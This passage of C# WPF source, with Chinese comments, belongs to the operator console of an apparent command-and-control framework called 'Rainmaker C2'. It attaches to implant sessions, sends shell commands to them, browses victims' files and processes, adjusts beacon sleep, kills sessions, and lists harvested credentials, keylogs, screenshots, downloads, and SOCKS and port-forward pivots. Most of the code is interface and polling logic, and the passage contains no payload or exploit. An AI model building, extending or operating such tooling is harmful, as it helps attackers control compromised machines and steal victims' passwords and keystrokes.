        /// 几毫秒就到; 而真正的执行结果要等植入体一个 sleep 周期。
        /// 这一行必须**从返回给解析器的内容里去掉**, 否则文件列表会多出一条
        /// "该行是植入体回传的原始文本"的假条目 (实测截图确认过)。
        ///
        /// 注意换行要补回去: 逐行过滤时若只 Append(line) 不补 '\n', 剩下的多行会粘成
        /// 一行, 把 ls 输出的表结构彻底毁掉。
        /// </summary>
        private static string StripCmdEcho(string seg, string cmd)
        {
            if (string.IsNullOrEmpty(seg)) return "";
            string echo = "> " + cmd;
            var sb = new StringBuilder();
            int i = 0;
            while (i < seg.Length)
            {
                int nl = seg.IndexOf('\n', i);
                string line = (nl < 0) ? seg.Substring(i) : seg.Substring(i, nl - i);
                if (line.TrimEnd('\r').Trim() != echo)
                {
                    sb.Append(line);
                    if (nl >= 0) sb.Append('\n');
                }
                if (nl < 0) break;
                i = nl + 1;
            }
            return sb.ToString();
        }

        /// <summary>等待期心跳: 复用既有轮询函数, 不引入新的网络路径。</summary>
        private async void WaitTick(object sender, EventArgs e)
        {
            if (!_waitActive) return;
            _termAutoScroll = false;
            if (_busy || !_running) return;
            try
            {
                await PollAsync();
            }
            catch
            {
                // 单次失败不终止等待, 由超时决定结果
            }
            if (DateTime.UtcNow - _waitLastProgress >= TimeSpan.FromSeconds(15))
                _waitAborted = true;
        }

        private void AbortWait(string why)
        {
            if (!_waitActive) return;
            _waitActive = false;
            _waitAborted = true;
            _waitTimer.Stop();
            if (why.Length > 0) SetStatus(why);
        }

        /// <summary>
        /// 取某个会话上报的 sleep (毫秒), 取不到回一个保守默认值。
        ///
        /// 用途是决定浏览器命令的等待超时: 命令要走**两个 sleep 周期** (下行被植入体取走
        /// 一个, 上行回结果再一个), 所以超时必须跟会话实际的 sleep 走。
        /// 写死秒数的后果实测过 —— sleep=5000ms 的会话上, 三条 ls 全部误报"未收到回传",
        /// 而命令其实执行得好好的。
        /// </summary>
        private int SleepOfSession(string sid)
        {
            try
            {
                for (int i = 0; i < _sessions.Count; i++)
                {
                    if (string.Equals(_sessions[i].Sid, sid, StringComparison.Ordinal))
                    {
                        long sl = _sessions[i].Sleep;
                        if (sl > 0 && sl < 3600000) return (int)sl;
                        break;
                    }
                }
            }
            catch { }
            return 5000;   // 会话还没进表: 按常见默认值算, 宁可多等也不误报失败
        }

        private bool DataBusyGuard()
        {
            if (!DataBusyLocked()) return false;
            SetStatus("正在等待上一条命令回传, 请稍候 (浏览器操作一次只跑一条)");
            return true;
        }

        private async Task PollOutputAsync()
        {
            string sid = _curSid;
            if (string.IsNullOrEmpty(sid)) return;
            long since = _since;
            try
            {
                using (var doc = await _api.GetOutputAsync(sid, since))
                {
                    var root = doc.RootElement;
                    if (!root.Bool("ok", true)) return;
                    foreach (var it in root.Arr("items"))
                    {
                        long ts = it.Long("ts");
                        // 服务端语义是 ts >= since, 因此游标前进 1 避免最后一条重复
                        if (ts >= since) since = ts + 1;
                        string text = Codec.B64(it.Str("text"));
                        AppendTermRaw(text);
                        // 关键: 边显示边留档。等待型操作按游标从 _outBuf 切段, 不重复拉流。
                        if (text.Length > 0) _outBuf.Add(new KeyValuePair<long, string>(ts, text));
                    }
                    if (_outBuf.Count > 400) _outBuf.RemoveRange(0, _outBuf.Count - 400);
                    // 期间用户可能已切走, 只有仍在同一会话时才写回游标
                    if (sid == _curSid) _since = since;
                }
            }
            catch (Exception ex)
            {
                SetStatus("输出增量拉取失败: " + ex.Message);
            }
        }

        /// <summary>
        /// 浏览器视图的会话源。
        /// 不能只看 GridSessions.SelectedItem: 差分轮询会用新对象替换同主键行,
        /// 而"设为当前会话"通过终端附着生效, 此时表格选中态可能是空的
        /// (右键设当前 / 代码附着都会出现)。以 <see cref="_curRow"/> 为准, 表格选中态仅作后备。
        /// </summary>
        private SessionRow CurrentSessionRow()
        {
            if (_curRow != null && string.Equals(_curRow.Sid, _curSid, StringComparison.Ordinal))
                return _curRow;
            return GridSessions.SelectedItem as SessionRow;
        }

        /// <summary>会话切换后刷新两个浏览器视图 (只刷新当前可见的标签页, 不打扰用户)。</summary>
        private void RefreshDataViews()
        {
            var cur = CurrentSessionRow();
            if (cur == null) { _fbSid = null; _procSid = null; return; }

            if (TabProcBrowser.IsSelected)
            {
                if (cur.Sid != _procSid) { _procSid = cur.Sid; _ = RefreshProcAsync(true); }
            }
            if (TabFileBrowser.IsSelected)
            {
                if (cur.Sid != _fbSid)
                {
                    _fbSid = cur.Sid;
                    _fsPlainHinted = false;
                    _ = EnterSessionRootAsync(cur);
                }
            }
        }

        /// <summary>lazily 初次进入文件视图: 会话名 + 根路径, 然后枚举。</summary>
        private async Task EnterSessionRootAsync(SessionRow row)
        {
            FsSession.Text = "会话 " + row.Sid + "  " + row.User + "@" + row.Host
                             + "  proto=" + row.Proto;
            _fsItems.Clear();
            ClearFsCache();     // 换会话: 上一台的目录缓存与路径语义全部失效
            FsCount.Text = "0 项";
            FsPath.Text = "";
            FsHint.Text = "正在读取植入体当前目录 (pwd) ...";

            if (!row.IsV2)
            {
                FsHint.Text = "会话 " + row.Sid + " 是 " + row.Proto
                              + " (legacy) 会话: 服务端只把 ls/pwd/cat 当 shell 命令执行, 输出是 dir / type 的文本表格, "
                              + "没有结构化的「类型 TAB 大小 TAB 名称」格式。命令仍会下发到会话终端, 但本视图无法填表。";
                SetStatus("文件浏览器: legacy 会话无原生 fs 输出, 已提示");
                return;
            }

            var r = await SendWaitAsync(row.Sid, "pwd", true, 1500, FsFirstOutputMs);
            if (!r.Ok)
            {
                FsHint.Text = "读取当前目录失败: " + r.Error;
                return;
            }
            // r.Raw 里混着服务端回显的 "> pwd" 提示行。直接 Clean().Trim() 会把
            // 提示行与结果粘成 "> pwdC:" 这种污染路径 (实测: 后续 ls 变成 "ls > pwdC:")。
            // 只取最后一个既非空、也不是回显提示的行。
            string cwd = LastNonEchoLine(r.Raw);
            if (cwd.Length == 0 || cwd.IndexOf("[-]", StringComparison.Ordinal) >= 0)
            {
                // 回退到**本平台的**根, 不是硬编码 C:\ ——
                // Linux 会话上回落 C:\ 就是"自动去查 C 盘"那种结果 (实测踩到)。
                cwd = RootFor(CurrentPathIsPosix());
                FsHint.Text = "pwd 未回传有效路径, 回退到 " + cwd;
            }
            await ListPathAsync(row.Sid, cwd, false);
        }

        private void ApplyState(JsonElement root)
        {
            // 会话
            var sessions = new List<SessionRow>();
            int v1 = 0, v2 = 0;
            foreach (var e in root.Arr("sessions"))
            {
                var r = new SessionRow();
                r.Sid = e.Str("sid");
                r.Proto = e.Str("proto", "?");
                r.Host = e.Str("host");
                r.User = e.Str("user");
                r.Arch = e.Str("arch");
                r.Pid = e.Long("pid");
                r.Ppid = e.Long("ppid");
                r.Proc = e.Str("proc");
                r.Os = e.Str("os");
                r.Addr = e.Str("addr");
                r.Idle = e.Long("idle");
                r.Sleep = e.Long("sleep");
                r.Jitter = e.Long("jitter");
                r.HasTask = e.Bool("has_task");
                if (r.Sid.Length == 0) continue;
                if (r.IsV2) v2++; else v1++;
                sessions.Add(r);
            }
            Sync(_sessions, sessions);
            SessionCount.Text = "会话 " + _sessions.Count;
            _v1Count = v1;
            _v2Count = v2;
            UpdateRight();

            // 监听器 (与 /api/listeners 同构; 运行时增删后靠这个 2 秒轮询自动收敛, 无新定时器)
            ApplyListeners(root);

            // 凭据
            var creds = new List<CredRow>();
            foreach (var e in root.Arr("credentials"))
            {
                var r = new CredRow();
                r.Id = e.Long("id");
                r.User = e.Str("user");
                r.Secret = e.Str("secret");
                r.Source = e.Str("source");
                r.Sid = e.Str("sid");
                r.Ts = e.Long("ts");
                r.CredKind = e.Long("cred_kind");
                creds.Add(r);
            }
            Sync(_creds, creds);
            CredCount.Text = _creds.Count + " 条";

            // 下载
            var downloads = new List<DownloadRow>();
            foreach (var e in root.Arr("downloads"))
            {
                var r = new DownloadRow();
                r.Id = e.Long("id");
                r.Name = e.Str("name");
                r.Size = e.Long("size");
                r.Sid = e.Str("sid");
                r.RemotePath = e.Str("remote_path");
                r.Path = e.Str("path");
                r.Ts = e.Long("ts");
                downloads.Add(r);
            }
            Sync(_downloads, downloads);

            // 截屏
            var shots = new List<ShotRow>();
            foreach (var e in root.Arr("screenshots"))
            {
                var r = new ShotRow();
                r.Id = e.Long("id");
                r.Sid = e.Str("sid");
                r.Path = e.Str("path");
                r.Size = e.Long("size");
                r.Ts = e.Long("ts");
                shots.Add(r);
            }
            Sync(_shots, shots);
            ShotCount.Text = _shots.Count + " 张";
            PrefetchScreenshots();

            // 键盘记录
            var keylogs = new List<KeylogRow>();
            foreach (var e in root.Arr("keylogs"))
            {
                var r = new KeylogRow();
                r.Id = e.Long("id");
                r.Sid = e.Str("sid");
                r.Source = e.Str("source");
                r.Text = e.Str("text");
                r.Ts = e.Long("ts");
                keylogs.Add(r);
            }
            Sync(_keylogs, keylogs);
            KeylogCount.Text = _keylogs.Count + " 条";

            // 事件日志
            var events = new List<EventRow>();
            foreach (var e in root.Arr("events"))
            {
                var r = new EventRow();
                r.Id = e.Long("id");
                r.Cat = e.Str("cat");
                r.Sid = e.Str("sid");
                r.Action = e.Str("action");
                r.Detail = e.Str("detail");
                r.Who = e.Str("who");
                r.Ts = e.Long("ts");
                events.Add(r);
            }
            Sync(_events, events);

            // 目标库: GET /api/state.targets。整块缺失时 Arr 返回空序列 -> 页面显示空表
            Sync(_targets, StateParse.Targets(root));
            UpdateTargetCount();

            // 代理枢轴: GET /api/state.proxy (SOCKS 入口 + rportfwd + 计数器)
            _proxyView = StateParse.Proxy(root);
            Sync(_socks, _proxyView.Socks);
            Sync(_rports, _proxyView.Rports);
            ProxyStats.Text = _proxyView.StatsText();
            SocksCount.Text = _socks.Count + " 个";
            RportCount.Text = _rports.Count + " 个";

            // 脚本插件: /api/state.scripts 摘要签名变化时补拉一次 GET /api/scripts (菜单/命令/诊断)
            ApplyScriptSummary(root);

            // 统一 Job 体系: /api/state.jobs + jobs_running (同一个 2 秒轮询, 差分刷新)
            ApplyJobs(root);

            // 服务端概况
            SrvAddrText.Text = _api.BaseUrl + "   ·   最近同步 " + DateTime.Now.ToString("HH:mm:ss");
            SrvHostText.Text = "host      " + root.Str("host", "-");
            SrvProtoText.Text = "proto_v2  " + root.Bool("proto_v2").ToString().ToLowerInvariant();
            SrvProfileText.Text = "profile   " + root.Str("profile", "-");
            var st = root.Field("stats");
            if (st.ValueKind == JsonValueKind.Object)
            {
                var parts = new List<string>();
                foreach (var p in st.EnumerateObject()) parts.Add(p.Name + "=" + p.Value.ToString());
                SrvStatsText.Text = "stats     " + string.Join("  ·  ", parts);
            }
            else
            {
                SrvStatsText.Text = "stats     -";
            }
        }

        // ------------------------------------------------------------ 终端

        /// <summary>追加输出; 仅当视图已在底部时自动滚动, 避免打断向上翻阅。</summary>
        private void AppendTermRaw(string text)
        {
            if (string.IsNullOrEmpty(text)) return;
            string s = Codec.Clean(text);
            if (s.Length == 0) return;

            bool atBottom = Terminal.VerticalOffset >= Terminal.ExtentHeight - Terminal.ViewportHeight - 3;
            var sb = new StringBuilder();
            foreach (string line in s.Split('\n'))
            {
                if (line.Length == 0) { sb.Append('\n'); continue; }
                sb.Append(line.StartsWith("> ", StringComparison.Ordinal) ? "\u279c " + line.Substring(2) : line);
                sb.Append('\n');
            }
            Terminal.AppendText(sb.ToString());
            if (atBottom && _termAutoScroll) Terminal.ScrollToEnd();
        }

        private void FocusCmd()
        {
            CmdInput.Focus();
            CmdInput.CaretIndex = CmdInput.Text.Length;
        }

        private void SelectSession(SessionRow row, bool force)
        {
            if (row == null) return;
            if (!force && row.Sid == _curSid) { FocusCmd(); return; }

            if (_waitActive && !string.Equals(row.Sid, _curSid, StringComparison.Ordinal))
                AbortWait("会话已切换, 浏览器等待已取消");

            _curSid = row.Sid;
            _curRow = row;
            _since = 0;
            _outBuf.Clear();
            Terminal.Clear();
            Terminal.AppendText("[*] 已附着会话 " + row.Sid + "  " + row.User + "@" + row.Host
                                + "  proto=" + row.Proto + "  arch=" + row.Arch + "\n");
            TermTitle.Text = "终端  " + row.Sid + "  " + row.User + "@" + row.Host
                             + "  proto=" + row.Proto + "  pid=" + row.PidText;
            TermDot.Fill = (Brush)FindResource("Ok");
            // 让表格高亮与实际附着的会话保持一致 (此前只能靠用户手点表格);
            // SelectSession 首行有 sid 相等即返回的判断, 因此不会递归。
            if (GridSessions.SelectedItem != row) GridSessions.SelectedItem = row;
            SetStatus("当前会话: " + row.Sid + "  (" + row.Proto + ")");
            FocusCmd();

            // 附着后立刻拉一次历史输出, 不等下一个 tick
            _ = PollOutputAsync();
        }

        private void GridSessions_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            var row = CurrentSessionRow();
            if (row != null) SelectSession(row, false);
        }

        private void GridSessions_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = CurrentSessionRow();
            if (row != null) SelectSession(row, true);
        }

        private void GridSessions_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null)
            {
                dr.IsSelected = true;
                _ctxRow = dr.Item as SessionRow;
            }
        }

        private void CmdInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                e.Handled = true;
                _ = SendCommandAsync();
                return;
            }
            if (e.Key == Key.Up)
            {
                if (_hist.Count > 0)
                {
                    if (_histIdx > 0) _histIdx--;
                    CmdInput.Text = _hist[_histIdx];
                    CmdInput.CaretIndex = CmdInput.Text.Length;
                }
                e.Handled = true;
                return;
            }
            if (e.Key == Key.Down)
            {
                if (_histIdx < _hist.Count - 1) { _histIdx++; CmdInput.Text = _hist[_histIdx]; }
                else { _histIdx = _hist.Count; CmdInput.Text = ""; }
                e.Handled = true;
            }
        }

        private async void Send_Click(object sender, RoutedEventArgs e)
        {
            await SendCommandAsync();
        }

        private async Task SendCommandAsync()
        {
            string cmd = CmdInput.Text.Trim();
            if (cmd.Length == 0) return;
            if (string.IsNullOrEmpty(_curSid))
            {
                SetStatus("请先在会话页选择一行会话再下发命令");
                return;
            }
            if (DataBusyLocked())
            {
                SetStatus("文件/进程浏览器正在等待回传, 请稍候再下发终端命令 (输出流会串行)");
                return;
            }

            CmdInput.Clear();
            _hist.Add(cmd);
            _histIdx = _hist.Count;

            // 握手也走等待: 命令确实被植入体执行时才回传结果 (v2 原生命令按类别返回)
            var r = await SendWaitAsync(_curSid, cmd, true, 2500);
            if (r.Ok) SetStatus("已下发并收到回传: " + cmd);
            else SetStatus("已下发 " + cmd + " : " + r.Error);
            FocusCmd();
        }

        private void ClearTerm_Click(object sender, RoutedEventArgs e)
        {
            Terminal.Clear();
            SetStatus("终端已清屏");
        }

        // ------------------------------------------------------------ 会话右键菜单

        private SessionRow TargetSession()
        {
            return _ctxRow ?? GridSessions.SelectedItem as SessionRow;
        }

        private void CtxSetCurrent_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetSession();
            if (row == null) { SetStatus("请先选择一行会话"); return; }
            SelectSession(row, true);
        }

        private async void CtxSleep_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetSession();
            if (row == null) { SetStatus("请先选择一行会话"); return; }
            if (!row.IsV2)
            {
                // 降级: 服务端 /api/session/sleep 只实现 v2 分支
                SetStatus("会话 " + row.Sid + " 是 " + row.Proto + " (legacy) 会话, 服务端不支持热更新 sleep; 可用命令 sleep <ms> <jitter> 下发");
                return;
            }

            var dlg = new SleepDialog(row.Sid, row.Sleep > 0 ? row.Sleep : 5000, row.Jitter);
            dlg.Owner = this;
            if (dlg.ShowDialog() != true) return;

            try
            {
                using (var doc = await _api.SetSleepAsync(row.Sid, dlg.SleepMs, dlg.Jitter))
                {
                    var root = doc.RootElement;
                    if (root.Bool("ok"))
                        SetStatus("已下发 SET_SLEEP " + row.Sid + " : " + dlg.SleepMs + " ms / " + dlg.Jitter + "%");
                    else
                        SetStatus("sleep 调整失败: " + root.Str("error", "服务端未返回原因"));
                }
            }
            catch (Exception ex)
            {
                SetStatus("sleep 调整失败 (网络): " + ex.Message);
            }
        }

        private async void CtxExit_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetSession();
            if (row == null) { SetStatus("请先选择一行会话"); return; }

            var ans = MessageBox.Show(this,
                "确定结束会话 " + row.Sid + " (" + row.User + "@" + row.Host + ") ?\n\n" +
                (row.IsV2
                    ? "将下发 KILL(0x2005), v2 植入体退出。"
                    : "v1 会话无独立 kill 接口, 降级为通过命令通道下发 exit。"),
                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) return;

            try
            {
                if (row.IsV2)
                {
                    using (var doc = await _api.ExitSessionAsync(row.Sid))
                    {
                        var root = doc.RootElement;
                        SetStatus(root.Bool("ok")
                            ? "已下发结束指令: " + row.Sid
                            : "结束会话失败: " + root.Str("error", "服务端未返回原因"));
                    }
                }
                else
                {
                    using (var doc = await _api.SendCommandAsync(row.Sid, "exit"))
                    {
                        var root = doc.RootElement;
                        SetStatus(root.Bool("ok")
                            ? "已通过命令通道下发 exit 到 legacy 会话 " + row.Sid
                            : "结束会话失败: " + root.Str("error", "服务端未返回原因"));
                    }
                }
            }
            catch (Exception ex)
            {
                SetStatus("结束会话失败 (网络): " + ex.Message);
            }
        }

        private void CtxCopy_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetSession();
            if (row == null) { SetStatus("请先选择一行会话"); return; }
            CopyToClipboard(row.ToInfoText(), "会话信息");
        }

        // ------------------------------------------------------------ 连接 / 连接配置

        /// <summary>顶栏地址的当前取值 (可编辑 ComboBox: 文本就是用户输入); 空则回默认地址。</summary>
        private string CurrentServerText()
        {
            string t = (ServerCombo.Text ?? "").Trim();
            return t.Length > 0 ? t : ConnStore.DefaultUrl;
        }

        private void SetServerText(string url)
        {
            _connGuard = true;
            ServerCombo.Text = ConnStore.Normalize(url);
            _connGuard = false;
        }

        /// <summary>
        /// 连接配置: 读 %APPDATA%\csdev\connections.json (不存在/损坏 -> 空表 + 默认地址)。
        /// **只存地址与用户名** —— 口令不落盘, 每次连接时由 LoginDialog 现取现用。
        /// </summary>
        private void InitConnView()
        {
            try { _connPath = ConnStore.DefaultPath(); } catch { _connPath = "connections.json"; }
            _conns = ConnStore.Load(_connPath);
            ConnStore.EnsureDefault(_conns);
            RefreshConnView();
            BtnConnSave.ToolTip = "保存当前地址与已登录用户名 → " + _connPath + "  (口令不落盘)";
            BtnConnDel.ToolTip = "从列表与 " + _connPath + " 里删除当前连接 (二次确认)";
        }

        /// <summary>重建下拉数据源; 文本框内容保持不变 (空时用第一项或默认地址)。</summary>
        private void RefreshConnView()
        {
            string cur = (ServerCombo.Text ?? "").Trim();
            _connGuard = true;
            ServerCombo.ItemsSource = null;
            ServerCombo.ItemsSource = _conns;
            if (cur.Length == 0) cur = _conns.Count > 0 ? _conns[0].Url : ConnStore.DefaultUrl;
            ServerCombo.Text = cur;
            _connGuard = false;
        }

        /// <summary>把「地址 + 用户名」写进配置 (按规范化地址去重, 最近使用排最前)。</summary>
        private bool SaveConn(string url, string user, string why)
        {
            ConnEntry e = ConnStore.Upsert(_conns, url, user);
            string err = ConnStore.Save(_connPath, _conns);
            RefreshConnView();
            if (err.Length > 0)
            {
                SetStatus("连接配置写入失败: " + err + "  (地址在本次会话内仍可用, 重启后不会保留)");
                return false;
            }
            if (why.Length > 0 && e != null) SetStatus(why + ": " + e.Display + "  →  " + _connPath);
            return true;
        }

        private void ServerCombo_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter) Connect_Click(sender, null);
        }

        /// <summary>
        /// 下拉里选了一条: 文本框已被 WPF 填成该项地址 (ConnEntry.ToString 只回地址),
        /// 这里只补一句"上次用的是哪个用户名", 不自动发请求。
        /// </summary>
        private void ServerCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (_connGuard) return;
            var c = ServerCombo.SelectedItem as ConnEntry;
            if (c == null) return;
            _connGuard = true;
            ServerCombo.Text = c.Url;
            _connGuard = false;
            SetStatus(c.User.Length > 0
                ? "已选中连接 " + c.Url + " (上次用 " + c.User + " 登录; 点『连接』, 再点『登录』输口令)"
                : "已选中连接 " + c.Url + " (未保存用户名; 点『连接』, 再点『登录』)");
        }

        private async void Connect_Click(object sender, RoutedEventArgs e)
        {
            string old = _api.BaseUrl;
            _api.BaseUrl = CurrentServerText();          // setter 内部做同一套规范化
            SetServerText(_api.BaseUrl);                 // 规范化结果回写输入框
            _running = true;
            _failStreak = 0;

            // 换服务端后旧令牌无意义 (令牌只存在于原服务端内存)
            if (!string.Equals(old, _api.BaseUrl, StringComparison.OrdinalIgnoreCase))
            {
                _api.Token = "";
                _authUser = "";
                _authRole = "";
                BtnLogin.Content = "登录";
                ApplyAccountAccess();
                UpdateRight();
            }

            SetStatus("正在连接 " + _api.BaseUrl + " ...");
            await PollAsync();
            if (_failStreak != 0) return;

            await LoadFormatsAsync(false);
            if (ConnStore.Find(_conns, _api.BaseUrl) == null)
                SetStatus("已连接 " + _api.BaseUrl + "  (该地址未保存: 点『保存』写入 " + _connPath + ")");
        }

        private void Login_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new LoginDialog(_api, _authUser.Length > 0 ? _authUser : SavedUserFor(_api.BaseUrl));
            dlg.Owner = this;
            if (dlg.ShowDialog() != true) return;

            _authUser = dlg.UserName;
            _authRole = dlg.Role;
            BtnLogin.Content = "重新登录";
            ApplyAccountAccess();

            // 登录成功顺手记住「地址 + 用户名」(口令不落盘): 下次连接可以直接预填用户名
            bool saved = SaveConn(_api.BaseUrl, _authUser, "");
            SetStatus("登录成功: 已附加 Bearer 令牌 (role=" + (_authRole.Length > 0 ? _authRole : "?")
                      + "), 后续所有请求自动携带" + (saved ? "; 已记住该连接的用户名" : ""));
            _ = AfterLoginAsync();
        }

        // ------------------------------------------------------------ 自绘标题栏

        /// <summary>
        /// 标题栏拖拽 + 双击最大化/还原。
        /// WindowStyle=None 之后这两件事系统不再代劳, 必须自己接;
        /// 缩放与窗口吸附则由 WindowChrome 的 ResizeBorderThickness 交给系统处理。
        /// </summary>
        private void TitleBar_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ClickCount == 2) { ToggleMaximize(); return; }
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                // 拖动过程中松开鼠标会抛 InvalidOperationException, 属正常现象
                try { DragMove(); } catch { }
            }
        }

        private void WinMin_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void WinMax_Click(object sender, RoutedEventArgs e)
        {
            ToggleMaximize();
        }

        private void ToggleMaximize()
        {
            WindowState = (WindowState == WindowState.Maximized)
                        ? WindowState.Normal
                        : WindowState.Maximized;
        }

        private void WinClose_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        /// <summary>窗口状态变化时同步最大化按钮的字形, 与系统标题栏的行为保持一致。</summary>
        protected override void OnStateChanged(EventArgs e)
        {
            base.OnStateChanged(e);
            try
            {
                // E922 = 最大化, E923 = 还原
                BtnWinMax.Content = (WindowState == WindowState.Maximized) ? "\uE923" : "\uE922";
            }
            catch { }
        }

        /// <summary>
        /// 句柄就绪后套用窗口特效: 亚克力(毛玻璃)背景 + Win11 圆角 + 标题栏染色。
        /// Win10 与更早的系统不支持的那几项会被 WinFx 内部静默跳过, 界面照常显示。
        /// </summary>
        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);
            // 色调取主题背景色, alpha 留一点让背后内容透上来 —— 全不透明等于没开模糊
            WinFx.Apply(this, Color.FromArgb(0xE8, 0xF5, 0xF6, 0xF8));
        }

        /// <summary>保存过的用户名 (没有就回 admin, 与 LoginDialog 的默认一致)。</summary>
        private string SavedUserFor(string url)
        {
            var c = ConnStore.Find(_conns, url);
            return c != null && c.User.Length > 0 ? c.User : "admin";
        }

        private async Task AfterLoginAsync()
        {
            await PollAsync();
            UpdateRight();
        }

        /// <summary>保存当前连接 (地址 + 已登录用户名)。ConnEntry 里没有口令字段, 所以无处可存。</summary>
        private void ConnSave_Click(object sender, RoutedEventArgs e)
        {
            string url = ConnStore.Normalize(CurrentServerText());
            SetServerText(url);
            SaveConn(url, _authUser, "已保存连接");
        }

        /// <summary>删除当前连接 (二次确认)。只动本地配置, 不影响服务端。</summary>
        private void ConnDelete_Click(object sender, RoutedEventArgs e)
        {
            string url = ConnStore.Normalize(CurrentServerText());
            var hit = ConnStore.Find(_conns, url);
            if (hit == null)
            {
                SetStatus("当前地址不在保存列表里, 无需删除: " + url);
                return;
            }

            var ans = MessageBox.Show(this,
                "从连接列表删除这一条?\n\n" + hit.Display + "\n\n"
                + "只删本地配置 (" + _connPath + ") 里的地址与用户名, 不影响正在运行的服务端; "
                + "口令从来就不在里面。",
                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) return;

            ConnStore.Remove(_conns, url);
            string err = ConnStore.Save(_connPath, _conns);
            RefreshConnView();
            if (err.Length > 0) { SetStatus("连接配置写入失败: " + err); return; }
            SetStatus("已删除连接 " + url + "  (剩余 " + _conns.Count + " 条)");
        }

        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            _running = false;
            _curSid = null;
            AbortWait("已断开: 浏览器等待已取消");
            _fbSid = null;
            _procSid = null;
            StatusDot.Fill = (Brush)FindResource("Err");
            StatusText.Text = "未连接";
            SetStatus("已断开轮询 (数据保留在本地表格; 令牌仍在内存里, 可直接『连接』)");
        }

        /// <summary>切到文件/进程页时按需刷新 (懒加载, 不在后台乱发命令)。</summary>
        private void MainTabs_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (e.OriginalSource != MainTabs) return;
            // 脚本页不依赖会话: 首次切到该页时懒加载一次 /api/scripts
            if (TabScripts.IsSelected && !_scriptOnce) _ = FetchScriptsAsync(false);
            // 插件包列表同理懒加载一次 (它是显式操作对象, 不参与 2 秒轮询 —— 见插件包区域注释)
            if (TabScripts.IsSelected && !_pluginOnce) _ = FetchPluginsAsync(false);
            // 账号列表同样不进 2 秒轮询: 进服务端页时懒加载一次, 之后靠『刷新』与增删改后重拉
            if (TabServer.IsSelected && !_usersOnce) _ = FetchUsersAsync(true);
            var row = CurrentSessionRow();
            if (row == null) return;
            if (DataBusyGuard()) return;

            if (TabFileBrowser.IsSelected && row.Sid != _fbSid)
            {
                _fbSid = row.Sid;
                _fsPlainHinted = false;
                _ = EnterSessionRootAsync(row);
            }
            else if (TabProcBrowser.IsSelected && row.Sid != _procSid)
            {
                _procSid = row.Sid;
                _ = RefreshProcAsync(true);
            }
        }

        private async void RefreshState_Click(object sender, RoutedEventArgs e)
        {
            await PollAsync();
        }

        private async void KillAll_Click(object sender, RoutedEventArgs e)
        {
            var ans = MessageBox.Show(this,
                "对所有 v2 会话下发 KILL 任务?\n\n服务端 /api/killall 仅覆盖 v2 会话 (v1 legacy 不在其遍历范围内)。",
                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) return;
            try
            {
                using (var doc = await _api.KillAllAsync())
                {
                    var root = doc.RootElement;
                    SetStatus(root.Bool("ok")
                        ? "已对 " + root.Long("count") + " 个 v2 会话下发终止"
                        : "批量终止失败: " + root.Str("error", "服务端未返回原因"));
                }
            }
            catch (Exception ex)
            {
                SetStatus("批量终止失败 (网络): " + ex.Message);
            }
        }

        // ------------------------------------------------------------ 文件浏览器

        /// <summary>文件视图只对 v2 会话有意义: v1 走 shell, ls 的输出是 dir 文本表格。</summary>
        private SessionRow FsSessionRow()
        {
            var row = CurrentSessionRow();
            if (row == null)
            {
                SetStatus("请先在「会话」页选择一行会话");
                FsHint.Text = "未选择会话: 文件浏览器的所有操作都针对当前选中会话。";
                return null;
            }
            if (!row.IsV2)
            {
                FsHint.Text = "会话 " + row.Sid + " 是 " + row.Proto + " (legacy) 会话: "
                              + "服务端把 ls/pwd/cat 当 shell 命令执行, 回传的是 dir / type 的文本表格, "
                              + "没有「类型 TAB 字节数 TAB 名称」结构, 本视图不填表。命令仍会下发到会话终端。";
                SetStatus("文件浏览器不支持 " + row.Proto + " 会话的原生 ls 输出");
                return null;
            }
            if (string.IsNullOrEmpty(_curSid))
            {
                SetStatus("请先双击会话行把它设为当前会话");
                return null;
            }
            return row;
        }

        /// <summary>取最后一个既非空、也不是服务端回显提示（"> cmd"）的行。</summary>
        private static string LastNonEchoLine(string raw)
        {
            if (string.IsNullOrEmpty(raw)) return "";
            string best = "";
            foreach (var line in raw.Split('\n'))
            {
                string s = line.Replace("\r", "").Trim();
                if (s.Length == 0) continue;
                if (s.StartsWith("> ", StringComparison.Ordinal)) continue;
                best = s;
            }
            return best;
        }

        private string FsSelPath()
        {            var it = GridFs.SelectedItem as FsItem;
            if (it == null || it.Raw) return "";
            return NativeParse.JoinRemote(_pathInput, it.Name, CurrentPathIsPosix());
        }

        /// <summary>
        /// 按植入体上报的 os 字符串判定是不是 POSIX 目标 (纯函数, 便于自测覆盖)。
        ///
        /// **判定顺序很重要**: 先认 Windows (win 侧上报的是 peb_os_version, 含 "Windows"),
        /// 再按发行版关键词认 POSIX。之前只匹配 linux/mac/bsd/unix, 而 Linux 植入体上报的
        /// 是 /etc/os-release 的 PRETTY_NAME —— 实测是 <c>"Ubuntu 24.04.1 LTS"</c>,
        /// 一个关键词都不命中, 于是被判成 Windows, 表现为"Linux 会话里自动去查 C 盘"。
        /// </summary>
        internal static bool OsIsPosix(string osText)
        {
            string os = (osText ?? "").ToLowerInvariant();
            if (os.Length == 0) return false;
            if (os.Contains("windows")) return false;      // 明确是 Windows, 直接收工
